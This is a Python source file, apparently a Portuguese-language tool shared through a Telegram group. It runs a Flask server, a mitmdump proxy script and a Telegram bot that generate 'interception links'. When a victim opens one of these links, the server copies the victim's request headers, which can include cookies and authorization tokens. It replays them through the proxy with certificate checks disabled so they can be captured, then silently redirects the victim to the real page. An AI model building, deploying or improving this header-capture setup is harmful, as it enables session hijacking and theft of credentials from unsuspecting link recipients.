#!/usr/bin/env python3
"""
Sistema Completo - MITMProxy Telegram Notifier
Criado por: @vgsswon
Grupo: https://t.me/+RriqgodAtpY4NTgx
"""
import os
import threading
import subprocess
import time
from flask import Flask, redirect, abort, request, Response
import requests
from shared_storage import storage

PROXY_URL = "http://127.0.0.1:8080"

app = Flask(__name__)

@app.after_request
def add_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    return response

def run_mitm_proxy():
    time.sleep(1)
    print("[Main] Iniciando MITMProxy...")
    subprocess.run([
        "mitmdump",
        "-s", "header_capture.py",
        "--listen-port", "8080"
    ])

def run_telegram_bot():
    time.sleep(2)
    print("[Main] Iniciando Bot Telegram...")
    subprocess.run(["python", "bot.py"])

def cleanup_task():
    import threading
    import time
    def worker():
        while True:
            time.sleep(600)
            try:
                storage.cleanup_expired()
            except Exception as e:
                print(f"[Main] Erro na limpeza: {e}")
    thread = threading.Thread(target=worker, daemon=True)
    thread.start()

@app.route('/')
def index():
    return """<!DOCTYPE html>
<html>
<head><title>MITMProxy Interceptor</title></head>
<body>
    <h1>MITMProxy Interceptor</h1>
    <p>Envie uma URL para o bot do Telegram para gerar um link de interceptação.</p>
    <p>Criado por: @vgsswon</p>
    <p>Grupo: <a href="https://t.me/+RriqgodAtpY4NTgx">https://t.me/+RriqgodAtpY4NTgx</a></p>
</body>
</html>"""

@app.route('/i/<url_id>')
def intercept(url_id):
    original_url = storage.get(url_id)
    
    if not original_url:
        return Response(
            '<h1>❌ Link Inválido ou Expirado</h1><p>Este link de interceptação não existe ou já expirou.</p><p>Gere um novo link usando o bot do Telegram.</p>',
            status=404,
            mimetype='text/html'
        )
    
    print(f"[Main] Interceptando URL: {original_url} (ID: {url_id})")
    
    try:
        proxies = {
            'http': PROXY_URL,
            'https': PROXY_URL,
        }
        
        skip_headers = {
            'host', 'connection', 'content-length', 'content-encoding',
            'transfer-encoding', 'upgrade', 'proxy-connection',
            'keep-alive', 'te', 'trailer', 'upgrade-insecure-requests'
        }
        
        headers = {}
        for header_name, header_value in request.headers:
            if header_name.lower() not in skip_headers:
                headers[header_name] = header_value
        
        headers['X-Intercept-Capture'] = 'true'
        
        print(f"[Main] Capturando {len(headers)} headers...")
        print(f"[Main] User-Agent: {headers.get('User-Agent', 'N/A')}")
        
        session = requests.Session()
        response = session.get(
            original_url,
            proxies=proxies,
            headers=headers,
            allow_redirects=False,
            verify=False,
            timeout=10
        )
        
        print(f"[Main] ✓ Headers capturados com sucesso!")
        print(f"[Main] Status da requisição: {response.status_code}")
        
    except Exception as e:
        print(f"[Main] ⚠ Erro ao fazer requisição via proxy: {e}")
        print(f"[Main] Redirecionando mesmo assim para: {original_url}")
    
    return redirect(original_url, code=302)

@app.route('/health')
def health():
    return {'status': 'ok', 'service': 'intercept-server'}

@app.route('/ping')
def ping():
    return {'status': 'alive', 'timestamp': time.time()}

if __name__ == '__main__':
    threading.Thread(target=run_mitm_proxy, daemon=True).start()
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    cleanup_task()
    
    port = int(os.environ.get('PORT', 10000))
    print(f"[Main] Iniciando servidor na porta {port}...")
    print("[Main] Sistema pronto!")
    
    from waitress import serve
    serve(app, host='0.0.0.0', port=port, threads=4)
